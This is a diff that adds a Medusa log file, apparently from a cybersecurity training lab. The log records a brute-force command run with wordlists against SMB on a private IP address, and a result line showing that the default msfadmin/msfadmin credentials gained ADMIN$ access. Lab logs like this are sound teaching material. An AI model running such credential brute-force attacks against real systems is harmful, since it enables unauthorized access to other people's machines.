@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2026-10-26 23:50:20)
+# medusa -h 192.168.1.106 -U /root/dio-cyber/wordlists/users.txt -P /root/dio-cyber/wordlists/passwords.txt -M smbnt -O /root/dio-cyber/logs/medusa_smb.log 
+2026-10-26 23:50:20 ACCOUNT FOUND: [smbnt] Host: 192.168.1.106 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-10-26 23:50:20).
